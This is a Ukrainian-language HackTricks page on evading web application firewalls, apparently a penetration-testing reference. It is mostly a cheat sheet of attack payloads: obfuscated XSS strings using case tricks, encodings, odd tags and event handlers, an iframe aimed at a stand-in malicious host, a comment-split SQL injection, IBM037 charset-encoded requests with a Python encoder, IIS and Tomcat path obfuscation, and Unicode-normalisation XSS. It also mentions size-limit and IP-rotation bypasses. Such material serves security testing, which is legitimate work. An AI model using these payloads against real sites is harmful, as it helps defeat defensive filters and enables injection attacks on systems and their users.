# –û–±—Ö—ñ–¥ WAF

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é –≤ —Ä–µ–∫–ª–∞–º—ñ –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF** –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub.

</details>

## –û–±—Ö—ñ–¥ Regex

–†—ñ–∑–Ω—ñ —Ç–µ—Ö–Ω—ñ–∫–∏ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è –æ–±—Ö–æ–¥—É —Ñ—ñ–ª—å—Ç—Ä—ñ–≤ regex –Ω–∞ –±—Ä–∞–Ω–¥–º–∞—É–µ—Ä–∞—Ö. –ü—Ä–∏–∫–ª–∞–¥–∏ –≤–∫–ª—é—á–∞—é—Ç—å —á–µ—Ä–≥—É–≤–∞–Ω–Ω—è —Ä–µ–≥—ñ—Å—Ç—Ä—É, –¥–æ–¥–∞–≤–∞–Ω–Ω—è —Ä–æ–∑—Ä–∏–≤—ñ–≤ —Ä—è–¥–∫—ñ–≤ —Ç–∞ –∫–æ–¥—É–≤–∞–Ω–Ω—è –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—å. –†–µ—Å—É—Ä—Å–∏ –¥–ª—è —Ä—ñ–∑–Ω–∏—Ö –æ–±—Ö–æ–¥—ñ–≤ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –Ω–∞ [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) —Ç–∞ [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS\_Filter\_Evasion\_Cheat\_Sheet.html). –ü—Ä–∏–∫–ª–∞–¥–∏ –Ω–∏–∂—á–µ –±—É–ª–∏ –≤–∑—è—Ç—ñ –∑ [—Ü—å–æ–≥–æ —Å—Ç–∞—Ç—Ç—ñ](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2).
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## –ö–æ–¥—É–≤–∞–Ω–Ω—è –Ω–∞–±–æ—Ä—É —Å–∏–º–≤–æ–ª—ñ–≤
```bash
# Charset encoding
application/x-www-form-urlencoded;charset=ibm037
multipart/form-data; charset=ibm037,boundary=blah
multipart/form-data; boundary=blah; charset=ibm037

##Python code
import urllib
s = 'payload'
print(urllib.parse.quote_plus(s.encode("IBM037")))

## Request example
GET / HTTP/1.1
Host: buggy
Content-Type: application/x-www-form-urlencoded; charset=ibm500
Content-Length: 61

%86%89%93%85%95%81%94%85=KKaKKa%C6%D3%C1%C7K%A3%A7%A3&x=L%A7n
```
## –ó–∞—Ç–µ–º–Ω–µ–Ω–Ω—è
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
## –°—É–º—ñ—Å–Ω—ñ—Å—Ç—å Unicode

–ó–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ —Ä–µ–∞–ª—ñ–∑–∞—Ü—ñ—ó –Ω–æ—Ä–º–∞–ª—ñ–∑–∞—Ü—ñ—ó Unicode (–¥–æ–¥–∞—Ç–∫–æ–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è [—Ç—É—Ç](https://jlajara.gitlab.io/Bypass\_WAF\_Unicode)), —Å–∏–º–≤–æ–ª–∏, —è–∫—ñ –º–∞—é—Ç—å —Å—É–º—ñ—Å–Ω—ñ—Å—Ç—å Unicode, –º–æ–∂—É—Ç—å –æ–±—ñ–π—Ç–∏ WAF —Ç–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏—Å—è —è–∫ –∑–∞–¥—É–º–∞–Ω–∏–π –≤—Ä–∞–∑–ª–∏–≤–∏–π –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è. –°—É–º—ñ—Å–Ω—ñ —Å–∏–º–≤–æ–ª–∏ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ [—Ç—É—Ç](https://www.compart.com/en/unicode)

### –ü—Ä–∏–∫–ª–∞–¥
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
Ôºúimg src‚Åºp onerror‚ÅºÔºáprompt‚ÅΩ1‚ÅæÔºáÔπ•  --> Ôºúimg src=p onerror='prompt(1)'>
```
## –ü–µ—Ä–µ–≤–∏—â–µ–Ω–Ω—è –æ–±–º–µ–∂–µ–Ω—å —â–æ–¥–æ —Ä–æ–∑–º—ñ—Ä—É

–£ —Ö–º–∞—Ä–Ω–∏—Ö WAF —á–∞—Å—Ç–æ –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è —Ç–∞–∫, —â–æ —è–∫—â–æ —Ä–æ–∑–º—ñ—Ä –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –±—ñ–ª—å—à–∏–π –∑–∞ —Ä–æ–∑–º—ñ—Ä X, –∑–∞–ø–∏—Ç –Ω–µ –±—É–¥–µ –ø–µ—Ä–µ–≤—ñ—Ä–µ–Ω–∏–π WAF. –í–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Å—Ç–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ –¥–ª—è –æ–±—Ö—ñ–¥—É —ó—Ö.

### –†–æ—Ç–∞—Ü—ñ—è IP

* [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin)
